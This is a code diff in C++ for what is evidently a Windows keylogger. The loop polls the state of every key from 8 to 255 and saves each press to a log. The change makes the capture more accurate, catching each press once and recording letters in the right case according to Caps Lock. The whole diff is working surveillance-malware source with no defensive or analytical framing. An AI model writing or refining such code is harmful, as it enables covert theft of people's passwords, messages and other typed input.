@@ -34,14 +34,20 @@ int main() {
 
     while (true) {
         for (int key = 8; key <= 255; key++) {
-            if (GetAsyncKeyState(key) & 0x8001) {
+            if (GetAsyncKeyState(key) & 0x01) {
 
                 auto it = specialKeys.find(key);
                 if (it != specialKeys.end()) {
                     saveData(it->second);
                 }
                 else {
-                    saveData(string(1, (char)key));
+                    if (GetKeyState(VK_CAPITAL)) {
+                        saveData(string(1, (char)toupper(key)));
+                    }
+                    else {
+                        saveData(string(1, (char)tolower(key)));
+                    }
+                    
                 }
             }
         }
